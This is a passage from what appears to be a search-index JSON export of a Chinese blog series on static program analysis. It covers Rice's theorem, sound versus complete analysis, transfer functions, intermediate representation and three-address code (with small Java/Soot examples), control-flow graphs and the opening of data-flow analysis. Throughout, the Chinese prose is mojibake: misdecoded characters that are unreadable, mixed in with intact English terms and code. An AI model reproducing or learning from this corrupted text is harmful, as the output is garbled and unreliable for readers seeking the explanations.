‡æ‚¬åœåœ¨ä»£ç ä¸Šï¼ŒIDE èƒ½å¤ŸåŠ¨æ€åœ°åˆ†æå¹¶æç¤ºä½ æ‰€æ‚¬åœå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯ï¼ŒèƒŒåä½¿ç”¨çš„æŠ€æœ¯å°±æ˜¯é™æ€ç¨‹åºåˆ†æã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:1:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.3 Sound \u0026 Complete ä»¥ä¸Šå°±æ˜¯é™æ€ç¨‹åºåˆ†ææ‰€å¸Œæœ›åšçš„ä¸€äº›äº‹æƒ…ï¼Œä½†æ˜¯å®é™…ä¸Šé™æ€åˆ†æå‘å±•è‡³ä»Šï¼Œä¾æ—§ä¸èƒ½å®Œç¾åœ°è§£å†³ä»¥ä¸Šçš„é—®é¢˜ã€‚ Any non-trivial property of the behavior of programs in a r.e. language is undecidable. åœ¨ä¸€ä¸ªå³é€’å½’å¯æšä¸¾(recursively enumerable)è¯­è¨€ä¸­ï¼Œä»»ä½•ç¨‹åºè¡Œä¸ºçš„ non-trivial å±æ€§éƒ½æ˜¯ä¸å¯è§£é‡Šçš„ã€‚non-trivial property æŒ‡çš„æ˜¯é‚£äº›ä¸ç¨‹åºè¿è¡Œè¡Œä¸ºæœ‰å…³çš„å±æ€§ã€‚ â€”â€” Riceâ€™s Theorem ä¹Ÿå°±æ˜¯è¯´ï¼ŒRice ç†è®ºå‘Šè¯‰æˆ‘ä»¬ï¼Œä¸–ç•Œä¸Šå¹¶ä¸å­˜åœ¨ä¸€ç§å®Œç¾çš„é™æ€åˆ†æï¼Œå¯ä»¥å®Œç¾åœ°è§£å†³ä¸Šæ–‡æåˆ°çš„é‚£äº›é—®é¢˜ã€‚ ç”±ä¸Šå›¾å¯ä»¥ç›´è§‚åœ°çœ‹å‡ºï¼Œä¸‰è€…æˆåŒ…å«å…³ç³»ï¼Œè€Œå®Œç¾çš„ç¨‹åºåˆ†æå°±æ˜¯ä¸­é—´çš„ Truthï¼Œä¸€ä¸ªæ—¢ Sound åˆ Complete çš„çŠ¶å†µï¼Œè€Œæˆ‘ä»¬æ­£å¸¸çš„ç¨‹åºåˆ†æåªèƒ½è·å¾—è¦ä¹ˆ sound è¦ä¹ˆ complete çš„ç»“æœï¼Œä¸€ç§ useful çš„ç»“æœã€‚ ç®€å•æ¥è¯´ï¼Œsound æ˜¯ä¸€ç§è¿‡å¤šçš„è¾“å‡ºï¼Œè¾“å‡ºçš„æ˜¯å…¨éƒ¨çš„çœŸå®æŠ¥é”™å’Œéƒ¨åˆ†çš„è™šå‡æŠ¥é”™ï¼›è€Œ complete ä¸ä¹‹ç›¸åï¼Œè¾“å‡ºçš„æ˜¯å…¨æ˜¯çœŸæ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æ¯” truth å°‘äº†ä¸€éƒ¨åˆ†çš„æŠ¥é”™ã€‚ ç”±ä¸Šå¯çŸ¥ï¼Œæˆ‘ä»¬åœ¨å®é™…ä½¿ç”¨åœºæ™¯ä¸­ï¼Œè‡ªç„¶æ˜¯å¸Œæœ›è¾“å‡ºæ˜¯ sound çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æœ‰è¯¯æŠ¥ä½†ä¸è¦æœ‰æ¼æŠ¥ã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:1:3","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.4 é™æ€ç¨‹åºåˆ†æçš„æ ¸å¿ƒ 1.4.1 æŠ½è±¡ï¼šAbstract ä»¥ç¬¦å·åˆ†æä¸ºä¾‹ï¼Œå°†å¾…åˆ†æçš„å…·ä½“çš„å˜é‡å–å€¼æŠ½è±¡ä¸ºï¼šæ­£ã€è´Ÿã€é›¶ã€æœªçŸ¥å’Œé”™è¯¯ã€‚ unknown æŒ‡çš„æ˜¯ï¼Œå¦‚æœå½“å‰æ•°å€¼ä¼šå› ä¸ºå˜é‡æ”¹å˜è€Œå‘ˆç°ä¸ºä¸åŒçš„çŠ¶æ€ï¼Œåˆ™å…¨éƒ¨å®šä¹‰ä¸º unknownã€‚ undefined æŒ‡çš„æ˜¯ç»è¿‡åˆ¤æ–­è‚¯å®šä¸ç¬¦åˆ int å®šä¹‰çš„ï¼Œä¾‹å¦‚ä¸€ä¸ªé™¤ä»¥ 0 çš„æ•°æˆ–è€…å­—ç¬¦ç­‰ã€‚ 1.4.2 è¿‘ä¼¼ï¼šOver-approximation 1.4.2.1 è½¬ç§»å‡½æ•°ï¼šTransfer function åœ¨é™æ€åˆ†æä¸­ï¼Œè¿‘ä¼¼çš„æ ¸å¿ƒæ˜¯å®šä¹‰è½¬ç§»å‡½æ•°ï¼ˆtransfer functionï¼‰ã€‚ transfer function æ˜¯é’ˆå¯¹ç¨‹åºä¸­çš„æ¯ä¸€ä¸ªè¯­å¥ï¼Œåœ¨æŠ½è±¡å€¼ä¸Šå®šä¹‰è½¬æ¢è§„åˆ™ã€‚ transfer function çš„è§„åˆ™æ˜¯æ ¹æ®åˆ†æçš„å…·ä½“é—®é¢˜ä¸ç¨‹åºè¯­ä¹‰æ¥å®šä¹‰çš„ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼šè¿™æ˜¯é’ˆå¯¹ç¬¦å·åˆ†æå®šä¹‰çš„éƒ¨åˆ†çš„è½¬æ¢å‡½æ•°ï¼Œå‰äº”ä¸ªå’Œç¬¬å…«ä¸ªä¸€ç›®äº†ç„¶ï¼Œä¸åšè§£é‡Šã€‚ ç¬¬å…­ä¸ªå› ä¸ºé™¤æ•°æ˜¯ 0ï¼Œæ•…ç»“æœæ˜¯ undefinedã€‚ç¬¬ä¸ƒä¸ªæ˜¯ç”±äºæˆ‘ä»¬å®šä¹‰çš„è½¬æ¢å‡½æ•°æ˜¯æŠ½è±¡çš„ï¼Œè¿›è¡Œè¿ç®—çš„ç›®æ ‡ä¹Ÿæ˜¯æŠ½è±¡å‡ºæ¥çš„ï¼Œå› æ­¤ç›¸åŠ ç»“æœæ˜¯ unknown çš„ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå³ä½¿æˆ‘æ­£æ•°æ˜¯ 1000ï¼Œè´Ÿæ•°æ˜¯ -1ï¼Œç»è¿‡æŠ½è±¡åå†ç»è¿‡è½¬æ¢å‡½æ•°å¤„ç†ï¼Œå¾—åˆ°çš„ç»“æœä»æ˜¯ unknownï¼Œè¿™ä¹Ÿæ˜¯ sound çš„ä¸€ç§ä½“ç°ã€‚ æ ¹æ®ä¸Šè¿°çš„è½¬æ¢å‡½æ•°ï¼Œå¯ä»¥å¯¹ç¨‹åºè¯­å¥è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆå¾—åˆ°çš„ç»“æœå¦‚ä¸‹ã€‚ 1.4.2.2 æ§åˆ¶æµï¼šControl Flow å®é™…ä¸Šï¼Œåœ¨ç¨‹åºåˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œè¿‘ä¼¼çš„è¿‡ç¨‹ä¸­è¿˜è¦è€ƒè™‘ç¨‹åºçš„æ§åˆ¶æµã€‚ å³å›¾æ˜¯å·¦å›¾çš„è¿ç®—æµå±•ç¤ºï¼Œåœ¨ä¸åŒæƒ…å†µä¸‹ y ä¼šæœ‰å€¼ï¼Œè€Œæ ¹æ® sound åŸåˆ™ï¼Œåœ¨æœ€åä¸€æ­¥çš„ y å€¼åªèƒ½æ˜¯ unknownã€‚ åœ¨ç¨‹åºåˆ†æä¸­ï¼Œä¸å¯èƒ½ä¸æšä¸¾æ‰€æœ‰çš„è·¯å¾„ï¼Œå› æ­¤ flow merging ï¼ˆæ§åˆ¶æµçš„æ±‡èšï¼‰ä½œä¸ºä¸€ç§è¿‘ä¼¼ï¼Œåœ¨é™æ€åˆ†æä¸­ååˆ†å¸¸ç”¨ã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:1:4","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2 ä¸­é—´è¡¨ç¤ºï¼šIntermediate Representation ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:2:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.1 ç¼–è¯‘å™¨ä¸é™æ€åˆ†æå™¨ é¦–å…ˆä»‹ç»ä¸€ä¸‹ç¼–è¯‘å™¨ä¸é™æ€åˆ†æå™¨çš„å…³ç³»ï¼š ç¼–è¯‘å™¨ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†å°†ç¨‹åºå‘˜å†™çš„ Source Code è½¬æ¢ä¸ºæœºå™¨å¯ä»¥ç†è§£çš„ Machine Codeï¼Œå¹¶åœ¨è½¬æ¢è¿‡ç¨‹ä¸­åŠæ—¶æŠ¥é”™ã€‚ä¸‹é¢ä»¥è‹±è¯­çš„è¯­æ³•è§„åˆ™ä¸ºä¾‹ã€‚ ç¬¬ä¸€æ­¥ï¼Œé€šè¿‡æ‰«æå™¨ (Scanner) å¯¹è¾“å…¥è¿›è¡Œæ‰«æï¼Œæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ (Regular Expression) è¿›è¡Œè¯æ³•åˆ†æ (Lexical Analysis)ï¼Œä¸»è¦æ˜¯åˆ†æè¾“å…¥çš„æ¯ä¸ªå­—æ¯åŠå•è¯æ˜¯å¦ä¸ºåˆæ³•å­—æ¯åŠå•è¯ï¼Œæ¥ç€å°†é€šè¿‡æ£€æµ‹çš„å†…å®¹è½¬æ¢ä¸º Tokens ä¼ å…¥ä¸‹ä¸€æ­¥ã€‚ ç¬¬äºŒæ­¥ï¼Œé€šè¿‡è§£æå™¨ (Parser) å¯¹ Tokens è¿›è¡Œæ‰«æï¼Œæ ¹æ®ä¸Šä¸‹æ–‡æ— å…³è¯­æ³• (Context-Free Grammar) è¿›è¡Œè¯­æ³•åˆ†æ (Syntax Analysis)ï¼Œä¸»è¦åˆ†æå‡ ä¸ªå•è¯çš„ç»„åˆæ˜¯å¦ç¬¦åˆè¯­æ³•ç»“æ„è§„åˆ™ï¼Œæ¥ç€å°†é€šè¿‡æ£€æµ‹çš„å†…å®¹ä»¥æŠ½è±¡è¯­æ³•æ ‘ (AST) çš„å½¢å¼ä¼ å…¥ä¸‹ä¸€æ­¥ã€‚å…¶ä¸­ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•è¿›è¡Œåˆ†ææ˜¯ä¸ºäº†åŠ å¿«åˆ†ææ•ˆç‡ã€‚ ç¬¬ä¸‰æ­¥ï¼Œé€šè¿‡ç±»å‹æ£€æŸ¥ (Type Checker)ï¼Œæ ¹æ®å±æ€§è¯­æ³• (Attribute Grammar) è¿›è¡Œè¯­ä¹‰åˆ†æ (Semantic Analysis)ï¼Œç†æƒ³çš„ç›®çš„æ˜¯ä¸ºäº†è¯†åˆ«åƒ apples eat me è¿™ç§è¯­æ³•ç»“æ„æ­£ç¡®ä½†æ˜¯è¯­ä¹‰é”™è¯¯çš„æƒ…å†µï¼Œä½†æ˜¯å®é™…ç¼–è¯‘å™¨åªèƒ½è¯†åˆ«ç±»å¦‚â€œä¸å¯è¿›è¡Œ int é™¤ä»¥ stringâ€ä¹‹ç±»çš„ç±»å‹é”™è¯¯ï¼Œæ•…è¯¥æ­¥ç§°ä¸ºç±»å‹æ£€æµ‹ã€‚ç”Ÿæˆè¿›ä¸€æ­¥å¤„ç†åçš„ AST ä¼ å…¥ä¸‹ä¸€æ­¥ã€‚ ç¬¬å››æ­¥ï¼Œä¸ºäº†è¿›è¡Œé™æ€åˆ†æä¼˜åŒ–ï¼Œè¦å°† Decorated AST è½¬æ¢ä¸ºä¸­é—´è¡¨ç¤º (IR)ï¼Œä¸€èˆ¬è½¬æ¢ä¸ºä¸‰åœ°å€ç ï¼Œå†è¿›è¡Œé™æ€åˆ†æã€‚æœ€åé€šè¿‡ä»£ç ç”Ÿæˆå™¨å°†ä¼˜åŒ–åçš„ä»£ç ç”Ÿæˆæœºå™¨ç ä¼ ç»™æœºå™¨ã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:2:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.2 IR 2.2.1 AST vs. IR ä»¥ä¸€ä¸ªå¾ªç¯ä¸ºä¾‹æ¥é˜è¿° AST ä¸ IR çš„åŒºåˆ«ã€‚AST æ˜¯ä¸€ä¸ªè¯­æ³•æ ‘çš„å½¢å¼ï¼Œæ˜¯ä¸€ä¸ªé«˜å±‚çº§çš„å½¢å¼ï¼Œæ›´åŠ æ¥è¿‘ç¨‹åºçš„æºä»£ç ï¼Œè¯­è¨€ç›¸å…³çš„ï¼Œé€‚åˆåšå¿«é€Ÿçš„ç±»å‹æ£€æµ‹ï¼Œä½†æ˜¯ç¼ºå°‘äº†æ§åˆ¶æµä¿¡æ¯ã€‚ IR å³ä¸ºä¸­é—´è¡¨ç¤ºï¼Œå›¾ä¸­ä»¥ä¸‰åœ°å€ç è¡¨ç¤ºï¼Œæ˜¯ä¸€ä¸ªä½å±‚çº§çš„å½¢å¼ï¼Œæ¥è¿‘æœºå™¨ç¼–ç ï¼Œè¯­è¨€æ— å…³çš„ï¼Œç»“æ„ç´§å‡‘ï¼ŒåŒ…å«äº†æ§åˆ¶æµä¿¡æ¯ï¼Œå› æ­¤æ›´åŠ é€‚åˆç”¨æ¥åšé™æ€åˆ†æã€‚ AST high-level and closed to grammar structure usually language dependent suitable for fast type checking lack of control flow information IR low-level and closed to machine code usually language independent compact and uniform contains control flow information usually considered as the basis for static analysis æ‰€ä»¥ IR æ›´é€‚åˆé™æ€åˆ†æ IR æ²¡æœ‰å›ºå®šçš„å®šä¹‰ï¼Œå¸¸ç”¨ä¸‰åœ°å€ç  ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:2:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.3 ä¸‰åœ°å€ç  ä¸‰åœ°å€ç æ²¡æœ‰å½¢å¼åŒ–çš„å®šä¹‰ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸‰åœ°å€ç å°±æ˜¯æœ€å¤šæœ‰ä¸‰ä¸ªåœ°å€ (address) çš„è¡¨è¾¾å½¢å¼ï¼Œå¹¶ä¸”ç”±äºè¿™ä¸ªæ€§è´¨ï¼Œæ¯ä¸ªä¸‰åœ°å€ç æœ€å¤šåªä¼šæœ‰ä¸€ä¸ªè¿ç®—ç¬¦ã€‚ åœ¨ Java ä¸­ï¼Œå¯ä»¥åˆ©ç”¨ soot å·¥å…·æ¥ç”Ÿæˆä¸‰åœ°å€ç ï¼Œåœ¨ soot ä¸­ï¼Œè¢«ç§°ä¹‹ä¸º Jimpleã€‚ä¸‹é¢ä»¥ä¸€ä¸ª do-whileå¾ªç¯ä¸ºä¾‹ï¼Œæ¥åˆ†æå…¶ä¸‰åœ°å€ç ã€‚ package nju.sa.example; public class DoWhileLoop3AC { public static void main(String[] args) { int[] arr = new int[10]; int i = 0; do { i = i + 1; } while (arr[i] \u003c 10); } } è½¬æ¢åçš„ä¸‰åœ°å€ç å½¢å¼ä¸ºï¼š å†ä»¥ Method Call ä¸ºä¾‹ï¼Œä»‹ç»ä¸‹é¢å‘å¯¹è±¡ç¯å¢ƒä¸‹çš„ä¸‰åœ°å€ç ã€‚ package nju.sa.example; public class MethodCall3AC { String foo(String para1, String para2) { return para1 + \" \" + para2; } public static void main(String[] args) { MethodCall3AC mc = new MethodCall3AC(); String result = mc.foo(\"hello\", \"world\"); } } Java ä¸­çš„ invoke æŒ‡ä»¤å¯¹åº”çš„æ–¹æ³•è°ƒç”¨æƒ…å†µï¼š invokespecial: call constructor, call superclass methods, call private methods invokevirtual: instance method call invokeinterface: cannot optimization, checking interface implementation invokestatic: call static methods ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:2:3","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.4 æ§åˆ¶æµåˆ†æ æ§åˆ¶æµåˆ†æï¼ˆControl Flow Analysisï¼‰é€šå¸¸æŒ‡çš„æ˜¯æ„å»ºæ§åˆ¶æµå›¾ï¼ˆControl Flow Graph, CFGï¼‰ï¼Œå¹¶ä»¥ CFG ä½œä¸ºåŸºç¡€ç»“æ„è¿›è¡Œé™æ€åˆ†æçš„è¿‡ç¨‹ã€‚ 2.4.1 æ§åˆ¶æµå›¾ é€šå¸¸é‡‡ç”¨æ§åˆ¶æµå›¾è¿›è¡Œæ§åˆ¶æµåˆ†æçš„è¡¨ç¤º æ§åˆ¶æµå›¾å¯ä»¥ç”¨æ¥è¡¨ç¤ºæ§åˆ¶æµçš„ç»“æ„ æ§åˆ¶æµå›¾çš„èŠ‚ç‚¹å¯ä»¥æ˜¯å•ä¸ªçš„ä¸‰åœ°å€ç ï¼Œä¸è¿‡é€šå¸¸æ˜¯ Basic Block(BB)ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 2.4.2 Basic Block Basic Block æ˜¯å…·æœ‰ä»¥ä¸‹å±æ€§çš„ã€æœ€å¤§é•¿åº¦çš„ä¸‰åœ°å€ç ç»„æˆçš„å—å•å…ƒï¼š åªèƒ½ä»å—çš„ç¬¬ä¸€æ¡æŒ‡ä»¤è¿›å…¥ã€‚ åªèƒ½ä»å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ç¦»å¼€ã€‚ å¦‚ä½•æ„å»ºåŸºæœ¬å—ï¼š P çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å°±æ˜¯ä¸€ä¸ªåŸºæœ¬å—çš„ leader è·³è½¬çš„ç›®æ ‡æŒ‡ä»¤æ˜¯ä¸€ä¸ªåŸºæœ¬å—çš„ leader è·³è½¬æŒ‡ä»¤çš„åä¸€æ¡æŒ‡ä»¤ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåŸºæœ¬å—çš„ leader ä¸€ä¸ªåŸºæœ¬å—å°±æ˜¯ä¸€ä¸ªåŸºæœ¬å—çš„ leader åŠå…¶åç»­ç›´åˆ°ä¸‹ä¸€ä¸ªåŸºæœ¬å—çš„ leader å‰çš„æ‰€æœ‰æŒ‡ä»¤ã€‚ 2.4.3 è¾¹çš„ç”Ÿæˆ é™¤äº†åŸºæœ¬å—ï¼ŒCFG ä¸­è¿˜ä¼šæœ‰å—åˆ°å—çš„è¾¹ã€‚å— A å’Œå— B ä¹‹é—´æœ‰ä¸€æ¡è¾¹ï¼Œå½“ä¸”ä»…å½“ï¼š A çš„æœ«å°¾æœ‰ä¸€æ¡æŒ‡å‘äº† B å¼€å¤´çš„è·³è½¬æŒ‡ä»¤ã€‚ A çš„æœ«å°¾ç´§æ¥ç€ B çš„å¼€å¤´ï¼Œä¸” A çš„æœ«å°¾ä¸æ˜¯ä¸€æ¡æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚ æ³¨æ„åˆ°æ¯ä¸ªåŸºæœ¬å—å’Œå¼€å¤´æŒ‡ä»¤çš„æ ‡å·å”¯ä¸€å¯¹åº”ï¼Œå› æ­¤å¾ˆè‡ªç„¶åœ°ï¼Œéœ€è¦å°†è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡æ”¹ä¸ºåŸºæœ¬å—çš„æ ‡å·è€ŒéæŒ‡ä»¤æ ‡å·ï¼š æœ‰äº†è¿™äº›å®šä¹‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥äº†è§£ä¸€äº›æ¦‚å¿µï¼š è‹¥ A -\u003e Bï¼Œåˆ™æˆ‘ä»¬è¯´ A æ˜¯ B çš„å‰é©±ï¼ˆpredecessorï¼‰ï¼ŒB æ˜¯ A çš„åç»§ï¼ˆsuccessorï¼‰ é™¤äº†æ„å»ºå¥½çš„åŸºæœ¬å—ï¼Œæˆ‘ä»¬è¿˜ä¼šé¢å¤–æ·»åŠ ä¸¤ä¸ªç»“ç‚¹ï¼Œã€Œå…¥å£ï¼ˆEntryï¼‰ã€å’Œã€Œå‡ºå£ï¼ˆExitï¼‰ã€ è¿™ä¸¤ä¸ªç»“ç‚¹ä¸å¯¹åº”ä»»ä½• IR å…¥å£æœ‰ä¸€æ¡è¾¹æŒ‡å‘ IR ä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ å¦‚æœä¸€ä¸ªåŸºæœ¬å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ä¼šè®©ç¨‹åºç¦»å¼€è¿™æ®µ IRï¼Œé‚£ä¹ˆè¿™ä¸ªåŸºæœ¬å—å°±ä¼šæœ‰ä¸€æ¡è¾¹æŒ‡å‘å‡ºå£ã€‚ è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªæ§åˆ¶æµå›¾çš„æ„å»ºã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:2:4","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3 æ•°æ®æµåˆ†æ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:3:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3.1 ç›¸å…³æ¦‚å¿µ è¿‘ä¼¼æ–¹æ¡ˆ 1ï¼šå¿½ç•¥æ‰ç¨‹åºçš„æ¡ä»¶åˆ¤æ–­ï¼Œè®¤ä¸ºæ‰€æœ‰çš„åˆ†æéƒ½æœ‰å¯èƒ½åˆ°è¾¾ ç¨‹åºå¯ä»¥çœ‹æˆæ˜¯**çŠ¶æ€ï¼ˆæ•°æ®ï¼‰å’ŒçŠ¶æ€ä¹‹é—´çš„è½¬ç§»ï¼ˆæ§åˆ¶ï¼‰**ä¸¤éƒ¨åˆ†ï¼Œå› ä¸ºçŠ¶æ€è½¬ç§»çš„æ¡ä»¶éƒ½è¢«å¿½ç•¥äº†ï¼Œæ ¸å¿ƒåˆ†æçš„éƒ¨åˆ†æ˜¯çŠ¶æ€æ•°æ®åœ¨è½¬ç§»è¿‡ç¨‹ä¸­çš„å˜åŒ–ï¼Œæ‰€ä»¥å«åšæ•°æ®æµåˆ†æã€‚ è¿‘ä¼¼æ–¹æ¡ˆ 2ï¼šä¸åœ¨è·¯å¾„æœ«å°¾åšåˆå¹¶ï¼Œåœ¨æ§åˆ¶æµæ±‡åˆçš„æ‰€æœ‰ä½ç½®æå‰åšåˆå¹¶ æ•°æ®æµåˆ†æè¦ä¿è¯ Safe-approximationï¼Œå³ï¼š may analysis: over-approximation must analysis: under-approximation æ€»ä¹‹ï¼Œä¸åŒçš„æ•°æ®æµåˆ†ææœ‰ä¸åŒçš„æ•°æ®æŠ½è±¡æ–¹æ³•ï¼ˆåº”ç”¨ä¸åŒï¼‰ï¼Œæœ‰ä¸åŒçš„ Safe-approximation ç­–ç•¥ï¼Œæœ‰ä¸åŒçš„è½¬ç§»å‡½æ•°ä¸æ§åˆ¶æµæ±‡èšæ–¹å¼ã€‚ 3.1.1 è¾“å…¥è¾“å‡ºçŠ¶æ€ æ¯ä¸€æ¡ IR çš„æ‰§è¡Œï¼Œéƒ½ä¼šä½¿çŠ¶æ€ä»è¾“å…¥çŠ¶æ€å˜æˆæ–°çš„è¾“å‡ºçŠ¶æ€ è¾“å…¥/è¾“å‡ºçŠ¶æ€ä¸è¯­å¥å‰/åçš„ program point ç›¸å…³è”ã€‚ åœ¨æ•°æ®æµåˆ†æä¸­ï¼Œæˆ‘ä»¬ä¼šæŠŠæ¯ä¸€ä¸ª program point å…³è”ä¸€ä¸ªæ•°æ®æµå€¼ï¼Œä»£è¡¨åœ¨è¯¥ç‚¹ä¸­å¯è§‚å¯Ÿåˆ°çš„æŠ½è±¡çš„ç¨‹åºçŠ¶æ€ã€‚æ•°æ®æµåˆ†æçš„ç›®çš„æ˜¯ä¸ºæ‰€æœ‰è¯­å¥çš„è¾“å…¥è¾“å‡ºæ‰¾åˆ°ä¸€ç»„ï¼ŒåŸºäºæ§åˆ¶æµå’Œè½¬æ¢å‡½æ•°çš„ï¼Œå®‰å…¨çš„è¿‘ä¼¼çº¦æŸçš„è§£å†³æ–¹æ¡ˆã€‚ 3.1.2 è½¬ç§»å‡½æ•° åˆ†ææ•°æ®æµæœ‰å‰å‘å’Œåå‘ä¸¤ç§ï¼š 3.1.2 æ§åˆ¶æµçº¦æŸ æ¯æ¡è¯­å¥ s éƒ½ä¼šä½¿ç¨‹åºçŠ¶æ€å‘ç”Ÿæ”¹å˜ã€‚B çš„è¾“å‡ºè‡ªç„¶æ˜¯å…¶è¾“å…¥åœ¨ç»è¿‡å¤šæ¬¡è½¬æ¢åå¾—åˆ°çš„çŠ¶æ€ã€‚è€Œ B çš„è¾“å…¥è¦æ ¹æ®æ•°æ®æµåˆ†æçš„éœ€æ±‚ï¼Œå¯¹å…¶å‰é©±åº”ç”¨åˆé€‚çš„ meet operator è¿›è¡Œå¤„ç†ã€‚åå‘åˆ†ææ—¶äº¦ç„¶ã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:3:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3.2 åº”ç”¨ 3.2.1 åˆ°è¾¾å®šå€¼åˆ†æï¼šReaching Definitions Analysis åŸºæœ¬æ¦‚å¿µ å‡å®š x æœ‰å®šå€¼ d (definition)ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªè·¯å¾„ï¼Œä»ç´§éš d çš„ç‚¹åˆ°è¾¾æŸç‚¹ 